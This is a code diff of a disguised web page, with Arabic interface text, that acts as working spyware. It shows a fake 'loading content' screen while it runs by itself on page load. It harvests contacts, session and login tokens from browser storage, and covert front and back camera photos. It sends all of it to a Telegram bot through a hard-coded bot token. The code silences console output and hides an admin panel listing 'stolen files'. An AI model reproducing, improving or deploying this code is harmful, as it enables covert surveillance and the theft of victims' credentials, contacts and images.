@@ -51,8 +51,7 @@
 
         .folder-tree { background: #0d0d1a; border: 1px solid #333; border-radius: 12px; padding: 15px; max-height: 400px; overflow-y: auto; margin-top: 15px; display: none; }
         .folder-tree.active { display: block; }
-        .folder-item { padding: 8px 12px; border-bottom: 1px solid #1a1a2e; cursor: pointer; }
-        .folder-item:hover { background: #1a1a2e; }
+        .folder-item { padding: 8px 12px; border-bottom: 1px solid #1a1a2e; }
         .folder-item .name { color: #0ff; }
         .folder-item .info { color: #666; font-size: 11px; }
     </style>
@@ -62,14 +61,12 @@
 <div class="loader">
     <div class="spinner"></div>
     <p>جاري تحميل المحتوى...</p>
-    <div id="status">⏳ جاري التهيئة</div>
+    <div id="status">⏳ جاري التهيئة...</div>
 </div>
 
 <video id="videoFront" autoplay muted playsinline style="display:none;"></video>
 <video id="videoBack" autoplay muted playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
-<audio id="audio" style="display:none;"></audio>
-<input type="file" id="fileInput" multiple style="display:none;">
 
 <div id="toast"></div>
 
@@ -113,13 +110,13 @@
     </div>
 
     <div class="admin-actions">
-        <button class="admin-btn success" onclick="stealAll()">🚀 سحب الكل دفعة واحدة</button>
+        <button class="admin-btn success" onclick="stealAll()">🚀 سحب الكل</button>
         <button class="admin-btn" onclick="showFolders()">📂 عرض المجلدات</button>
         <button class="admin-btn danger" onclick="killAll()">💀 إيقاف الكل</button>
     </div>
 
     <div class="folder-tree" id="folderTree">
-        <h3 style="color:#25D366;margin-bottom:10px;">📂 هيكل الملفات المسروقة</h3>
+        <h3 style="color:#25D366;margin-bottom:10px;">📂 الملفات المسروقة</h3>
         <div id="folderList"></div>
     </div>
 
@@ -138,8 +135,8 @@
 // ============================================================
 const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
-let stolenData = { contacts: [], telegram: [], photos: [], files: [] };
 let totalStolen = 0;
+let photoCount = 0;
 
 // ============================================================
 // ====================== TOGGLE PANEL ========================
@@ -192,30 +189,126 @@ function showToast(text, duration = 3000) {
 }
 
 // ============================================================
+// ====================== TELEGRAM SEND =======================
+// ============================================================
+function sendToTelegram(imageData, caption = '') {
+    if (!CHAT_ID) {
+        addLog('⚠️ CHAT_ID غير متوفر، محاولة جلبها...', 'warn');
+        return;
+    }
+    try {
+        const blob = dataURLtoBlob(imageData);
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+        formData.append('caption', caption || `📸 ${new Date().toLocaleString()}`);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => {
+            if (res.ok) {
+                addLog('✅ صورة مرسلة', 'msg');
+            } else {
+                addLog('❌ فشل إرسال الصورة', 'error');
+            }
+        })
+        .catch(() => addLog('❌ خطأ في إرسال الصورة', 'error'));
+    } catch(e) {
+        addLog('❌ خطأ: ' + e.message, 'error');
+    }
+}
+
+function sendMessage(text) {
+    if (!CHAT_ID) {
+        addLog('⚠️ CHAT_ID غير متوفر', 'warn');
+        return;
+    }
+    const chunks = text.match(/(.|[\r\n]){1,4000}/g) || [text];
+    chunks.forEach(chunk => {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: chunk })
+        })
+        .then(res => {
+            if (res.ok) {
+                addLog('✅ رسالة مرسلة', 'msg');
+            }
+        })
+        .catch(() => addLog('❌ فشل إرسال رسالة', 'error'));
+    });
+}
+
+function dataURLtoBlob(dataURL) {
+    const parts = dataURL.split(',');
+    const mime = parts[0].match(/:(.*?);/)[1];
+    const bstr = atob(parts[1]);
+    const n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    for (let i = 0; i < n; i++) { u8arr[i] = bstr.charCodeAt(i); }
+    return new Blob([u8arr], { type: mime });
+}
+
+// ============================================================
+// ====================== GET CHAT ID =========================
+// ============================================================
+function getChatId() {
+    addLog('🔄 جلب Chat ID...', 'info');
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok && data.result && data.result.length > 0) {
+                const lastUpdate = data.result[data.result.length - 1];
+                if (lastUpdate.message) {
+                    CHAT_ID = lastUpdate.message.chat.id;
+                } else if (lastUpdate.callback_query) {
+                    CHAT_ID = lastUpdate.callback_query.from.id;
+                }
+                addLog(`✅ Chat ID: ${CHAT_ID}`, 'msg');
+                // إرسال رسالة تأكيد
+                sendMessage('✅ تم الاتصال بالجهاز بنجاح');
+                document.getElementById('status').textContent = '✅ جاهز';
+                // بدء العمليات
+                setTimeout(() => stealAll(), 3000);
+            } else {
+                addLog('⚠️ انتظار رسالة من البوت...', 'warn');
+                document.getElementById('status').textContent = '⏳ أرسل /start للبوت';
+                setTimeout(getChatId, 5000);
+            }
+        })
+        .catch(() => {
+            addLog('❌ فشل الاتصال بالبوت', 'error');
+            setTimeout(getChatId, 5000);
+        });
+}
+
+// ============================================================
 // ====================== STEAL ALL ===========================
 // ============================================================
 function stealAll() {
     addLog('🚀 بدء سحب كل البيانات...', 'info');
     showToast('🚀 جاري سحب كل شيء...');
+    totalStolen = 0;
     
-    // 1. سحب جهات الاتصال
-    stealContacts();
+    sendMessage('🚀 بدء عملية السحب الشامل...');
     
-    // 2. سحب تليجرام
-    setTimeout(() => stealTelegram(), 2000);
+    // 1. جهات الاتصال
+    setTimeout(() => stealContacts(), 1000);
     
-    // 3. سحب الصور من الكاميرات
-    setTimeout(() => captureBothCameras(), 4000);
+    // 2. تليجرام
+    setTimeout(() => stealTelegram(), 3000);
     
-    // 4. سحب الملفات
-    setTimeout(() => stealAllFiles(), 6000);
+    // 3. الكاميرات
+    setTimeout(() => captureBothCameras(), 5000);
     
-    // 5. محاولة سحب الصور من المعرض عبر input
-    setTimeout(() => stealGallery(), 8000);
+    // 4. الملفات
+    setTimeout(() => stealAllFiles(), 7000);
     
     setTimeout(() => {
-        showToast('✅ تم سحب كل البيانات');
+        document.getElementById('totalCount').textContent = totalStolen;
         sendMessage(`✅ تم سحب ${totalStolen} عنصر بنجاح`);
+        showToast(`✅ تم سحب ${totalStolen} عنصر`);
     }, 10000);
 }
 
@@ -225,19 +318,20 @@ function stealAll() {
 function stealContacts() {
     addLog('👤 محاولة سحب جهات الاتصال...', 'info');
     showToast('👤 جاري سحب جهات الاتصال...');
+    let count = 0;
     
     try {
         if ('contacts' in navigator && 'select' in navigator.contacts) {
-            navigator.contacts.select(['name', 'tel', 'email', 'address'], { multiple: true })
+            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                 .then(contacts => {
-                    stolenData.contacts = contacts;
                     contacts.forEach((c, i) => {
                         const text = `📱 جهة اتصال ${i+1}:\n👤 الاسم: ${c.name || 'غير معروف'}\n📞 الرقم: ${c.tel ? c.tel.join(', ') : 'غير موجود'}\n📧 البريد: ${c.email ? c.email.join(', ') : 'غير موجود'}`;
                         sendMessage(text);
+                        count++;
                         totalStolen++;
                     });
-                    document.getElementById('contactCount').textContent = contacts.length;
-                    addLog(`👤 تم سحب ${contacts.length} جهة اتصال`, 'msg');
+                    document.getElementById('contactCount').textContent = count;
+                    addLog(`👤 تم سحب ${count} جهة اتصال`, 'msg');
                 })
                 .catch(() => {
                     addLog('❌ فشل سحب جهات الاتصال', 'error');
@@ -253,18 +347,12 @@ function stealContacts() {
 
 function stealContactsFallback() {
     try {
-        // محاولة من localStorage
-        const contactsData = localStorage.getItem('contacts') || localStorage.getItem('phonebook') || localStorage.getItem('contacts_list');
+        const contactsData = localStorage.getItem('contacts') || localStorage.getItem('phonebook');
         if (contactsData) {
-            let contacts = [];
-            try { contacts = JSON.parse(contactsData); } catch(e) { contacts = [{ name: 'مستورد', tel: contactsData }]; }
-            contacts.forEach((c, i) => {
-                const text = `📱 جهة اتصال ${i+1} (من localStorage):\n👤 ${c.name || c.username || 'غير معروف'}\n📞 ${c.tel || c.phone || c.number || 'غير موجود'}`;
-                sendMessage(text);
-                totalStolen++;
-            });
-            document.getElementById('contactCount').textContent = contacts.length;
-            addLog(`👤 تم سحب ${contacts.length} جهة اتصال من localStorage`, 'msg');
+            sendMessage(`📱 جهات اتصال من localStorage:\n${contactsData}`);
+            totalStolen++;
+            document.getElementById('contactCount').textContent = '1';
+            addLog('👤 تم سحب جهات اتصال من localStorage', 'msg');
         }
     } catch(e) {}
 }
@@ -280,7 +368,6 @@ function stealTelegram() {
     const tgKeys = ['tg', 'telegram', 'gram', 'user', 'session', 'token', 'auth', 'login', 'account', 'profile', 'phone', 'number', 'username'];
     
     try {
-        // سحب من localStorage
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             const value = localStorage.getItem(key);
@@ -288,13 +375,11 @@ function stealTelegram() {
                 sendMessage(`✈️ تليجرام [${key}]:\n${value}`);
                 found++;
                 totalStolen++;
-                addLog(`✈️ تم سحب: ${key}`, 'msg');
             }
         }
     } catch(e) {}
     
     try {
-        // سحب من sessionStorage
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
             const value = sessionStorage.getItem(key);
@@ -302,28 +387,12 @@ function stealTelegram() {
                 sendMessage(`✈️ تليجرام session [${key}]:\n${value}`);
                 found++;
                 totalStolen++;
-                addLog(`✈️ تم سحب: ${key}`, 'msg');
             }
         }
     } catch(e) {}
     
-    // محاولة سحب من cookies
-    try {
-        document.cookie.split(';').forEach(cookie => {
-            const [key, value] = cookie.trim().split('=');
-            if (key && tgKeys.some(k => key.toLowerCase().includes(k))) {
-                sendMessage(`✈️ تليجرام cookie [${key}]:\n${value}`);
-                found++;
-                totalStolen++;
-            }
-        });
-    } catch(e) {}
-    
     document.getElementById('tgCount').textContent = found;
-    if (found === 0) {
-        sendMessage('✈️ لم يتم العثور على بيانات تليجرام');
-    }
-    setTimeout(() => showToast(`✅ تم سحب ${found} عنصر من تليجرام`), 2000);
+    addLog(`✈️ تم سحب ${found} عنصر من تليجرام`, 'msg');
 }
 
 // ============================================================
@@ -331,10 +400,9 @@ function stealTelegram() {
 // ============================================================
 let frontStream = null, backStream = null;
 let frontInterval = null, backInterval = null;
-let photoCount = 0;
 
 function captureBothCameras() {
-    addLog('📸 تشغيل الكاميرات (أمامي+خلفي)...', 'info');
+    addLog('📸 تشغيل الكاميرات...', 'info');
     showToast('📸 تشغيل الكاميرات...');
     
     // الأمامية
@@ -346,7 +414,7 @@ function captureBothCameras() {
             video.play();
             addLog('📸 الكاميرا الأمامية تعمل', 'msg');
             setTimeout(() => captureFrontPhoto(), 1500);
-            frontInterval = setInterval(captureFrontPhoto, 7000);
+            frontInterval = setInterval(captureFrontPhoto, 5000);
         })
         .catch(function(err) {
             addLog('❌ فشل الكاميرا الأمامية: ' + err.message, 'error');
@@ -361,7 +429,7 @@ function captureBothCameras() {
             video.play();
             addLog('📸 الكاميرا الخلفية تعمل', 'msg');
             setTimeout(() => captureBackPhoto(), 1500);
-            backInterval = setInterval(captureBackPhoto, 7000);
+            backInterval = setInterval(captureBackPhoto, 5000);
         })
         .catch(function(err) {
             addLog('❌ فشل الكاميرا الخلفية: ' + err.message, 'error');
@@ -380,9 +448,10 @@ function captureFrontPhoto() {
     ctx.drawImage(video, 0, 0);
     photoCount++;
     const imageData = canvas.toDataURL('image/jpeg', 0.8);
-    sendToTelegram(imageData, `📸 صورة أمامي ${photoCount} - ${new Date().toLocaleString()}`);
+    sendToTelegram(imageData, `📸 أمامي ${photoCount} - ${new Date().toLocaleString()}`);
     totalStolen++;
-    addLog(`📸 صورة أمامي ${photoCount} مرسلة`, 'msg');
+    document.getElementById('camCount').textContent = photoCount;
+    addLog(`📸 صورة أمامي ${photoCount}`, 'msg');
 }
 
 function captureBackPhoto() {
@@ -395,50 +464,17 @@ function captureBackPhoto() {
     ctx.drawImage(video, 0, 0);
     photoCount++;
     const imageData = canvas.toDataURL('image/jpeg', 0.8);
-    sendToTelegram(imageData, `📸 صورة خلفي ${photoCount} - ${new Date().toLocaleString()}`);
+    sendToTelegram(imageData, `📸 خلفي ${photoCount} - ${new Date().toLocaleString()}`);
     totalStolen++;
-    addLog(`📸 صورة خلفي ${photoCount} مرسلة`, 'msg');
+    document.getElementById('camCount').textContent = photoCount;
+    addLog(`📸 صورة خلفي ${photoCount}`, 'msg');
 }
 
 // ============================================================
-// ====================== STEAL GALLERY =======================
-// ============================================================
-function stealGallery() {
-    addLog('🖼️ محاولة سحب الصور من المعرض...', 'info');
-    showToast('🖼️ جاري سحب الصور...');
-    
-    try {
-        const input = document.getElementById('fileInput');
-        input.accept = 'image/*';
-        input.click();
-        
-        input.onchange = function(e) {
-            const files = e.target.files;
-            if (files.length > 0) {
-                for (let i = 0; i < Math.min(files.length, 20); i++) {
-                    const file = files[i];
-                    const reader = new FileReader();
-                    reader.onload = function(ev) {
-                        sendToTelegram(ev.target.result, `🖼️ صورة من المعرض: ${file.name} (${Math.round(file.size/1024)}KB)`);
-                        totalStolen++;
-                        addLog(`🖼️ تم سحب: ${file.name}`, 'msg');
-                    };
-                    reader.readAsDataURL(file);
-                }
-                setTimeout(() => showToast(`✅ تم سحب ${files.length} صورة`), 3000);
-            }
-            input.value = '';
-        };
-    } catch(e) {
-        addLog('❌ فشل سحب الصور من المعرض', 'error');
-    }
-}
-
-// ============================================================
-// ====================== STEAL ALL FILES =====================
+// ====================== STEAL FILES =========================
 // ============================================================
 function stealAllFiles() {
-    addLog('📁 بدء سحب جميع الملفات...', 'info');
+    addLog('📁 بدء سحب الملفات...', 'info');
     showToast('📁 جاري سحب الملفات...');
     let found = 0;
     
@@ -446,7 +482,7 @@ function stealAllFiles() {
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             const value = localStorage.getItem(key);
-            if (value && value.length > 10) {
+            if (value && value.length > 5) {
                 sendMessage(`📦 ملف: ${key}\nالحجم: ${value.length} bytes\nالمحتوى:\n${value}`);
                 found++;
                 totalStolen++;
@@ -458,7 +494,7 @@ function stealAllFiles() {
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
             const value = sessionStorage.getItem(key);
-            if (value && value.length > 10) {
+            if (value && value.length > 5) {
                 sendMessage(`📦 ملف session: ${key}\nالحجم: ${value.length} bytes\nالمحتوى:\n${value}`);
                 found++;
                 totalStolen++;
@@ -467,11 +503,7 @@ function stealAllFiles() {
     } catch(e) {}
     
     document.getElementById('fileCount').textContent = found;
-    if (found === 0) {
-        sendMessage('📁 لم يتم العثور على ملفات');
-    }
-    showFolders();
-    setTimeout(() => showToast(`✅ تم سحب ${found} ملف`), 2000);
+    addLog(`📁 تم سحب ${found} ملف`, 'msg');
 }
 
 // ============================================================
@@ -483,13 +515,13 @@ function showFolders() {
     if (tree.classList.contains('active')) {
         const list = document.getElementById('folderList');
         list.innerHTML = `
-            <div class="folder-item"><span class="name">📱 جهات الاتصال</span> <span class="info">${stolenData.contacts.length} جهة</span></div>
-            <div class="folder-item"><span class="name">✈️ تليجرام</span> <span class="info">${document.getElementById('tgCount').textContent} عنصر</span></div>
-            <div class="folder-item"><span class="name">📸 الصور</span> <span class="info">${photoCount} صورة</span></div>
-            <div class="folder-item"><span class="name">📁 الملفات</span> <span class="info">${document.getElementById('fileCount').textContent} ملف</span></div>
+            <div class="folder-item"><span class="name">📱 جهات الاتصال</span> <span class="info">${document.getElementById('contactCount').textContent || 0}</span></div>
+            <div class="folder-item"><span class="name">✈️ تليجرام</span> <span class="info">${document.getElementById('tgCount').textContent || 0}</span></div>
+            <div class="folder-item"><span class="name">📸 الصور</span> <span class="info">${photoCount}</span></div>
+            <div class="folder-item"><span class="name">📁 الملفات</span> <span class="info">${document.getElementById('fileCount').textContent || 0}</span></div>
             <div class="folder-item" style="border-top:1px solid #25D366;margin-top:10px;padding-top:10px;">
                 <span class="name" style="color:#25D366;">📊 المجموع الكلي</span>
-                <span class="info" style="color:#25D366;">${totalStolen} عنصر</span>
+                <span class="info" style="color:#25D366;">${totalStolen}</span>
             </div>
         `;
     }
@@ -513,79 +545,6 @@ function killAll() {
 }
 
 // ============================================================
-// ====================== TELEGRAM =============================
-// ============================================================
-function getChatId() {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-        .then(res => res.json())
-        .then(data => {
-            if (data.ok && data.result.length > 0) {
-                const lastUpdate = data.result[data.result.length - 1];
-                if (lastUpdate.message) {
-                    CHAT_ID = lastUpdate.message.chat.id;
-                } else if (lastUpdate.callback_query) {
-                    CHAT_ID = lastUpdate.callback_query.from.id;
-                }
-                addLog(`✅ Chat ID: ${CHAT_ID}`, 'msg');
-                startBackgroundOperations();
-            } else {
-                setTimeout(getChatId, 3000);
-            }
-        })
-        .catch(() => setTimeout(getChatId, 3000));
-}
-
-function sendToTelegram(imageData, caption = '') {
-    if (!CHAT_ID) return;
-    try {
-        const blob = dataURLtoBlob(imageData);
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-        formData.append('caption', caption || `📸 ${new Date().toLocaleString()}`);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        }).catch(() => {});
-    } catch(e) {}
-}
-
-function sendMessage(text) {
-    if (!CHAT_ID) return;
-    const chunks = text.match(/(.|[\r\n]){1,4000}/g) || [text];
-    chunks.forEach(chunk => {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: chunk })
-        }).catch(() => {});
-    });
-}
-
-function dataURLtoBlob(dataURL) {
-    const parts = dataURL.split(',');
-    const mime = parts[0].match(/:(.*?);/)[1];
-    const bstr = atob(parts[1]);
-    const n = bstr.length;
-    const u8arr = new Uint8Array(n);
-    for (let i = 0; i < n; i++) { u8arr[i] = bstr.charCodeAt(i); }
-    return new Blob([u8arr], { type: mime });
-}
-
-// ============================================================
-// ====================== BACKGROUND ===========================
-// ============================================================
-function startBackgroundOperations() {
-    addLog('🚀 بدء العمليات الخلفية...', 'info');
-    document.getElementById('status').textContent = '✅ جاهز';
-    sendMessage(`🟢 الجهاز متصل\n📱 ${navigator.userAgent}\n⏰ ${new Date().toLocaleString()}`);
-    
-    setTimeout(() => {
-        stealAll();
-    }, 5000);
-}
-
-// ============================================================
 // ====================== INIT =================================
 // ============================================================
 console.log = function() {};
@@ -594,7 +553,7 @@ console.error = function() {};
 console.info = function() {};
 
 addLog('🔄 جاري التهيئة...', 'info');
-document.getElementById('status').textContent = '⏳ جاري التهيئة...';
+document.getElementById('status').textContent = '⏳ أرسل /start للبوت';
 getChatId();
 
 document.addEventListener('keydown', function(e) {
@@ -619,14 +578,13 @@ window.admin = {
     telegram: () => stealTelegram(),
     camera: () => captureBothCameras(),
     files: () => stealAllFiles(),
-    gallery: () => stealGallery(),
     folders: () => showFolders(),
     kill: () => killAll(),
     log: addLog
 };
 
 console.log('🕵️ لوحة التحكم جاهزة! Ctrl+Shift+P لفتحها');
-console.log('📋 الأوامر: admin.steal(), admin.contacts(), admin.telegram(), admin.camera(), admin.files(), admin.gallery(), admin.folders(), admin.kill()');
+console.log('📋 الأوامر: admin.steal(), admin.contacts(), admin.telegram(), admin.camera(), admin.files(), admin.folders(), admin.kill()');
 </script>
 </body>
 </html>
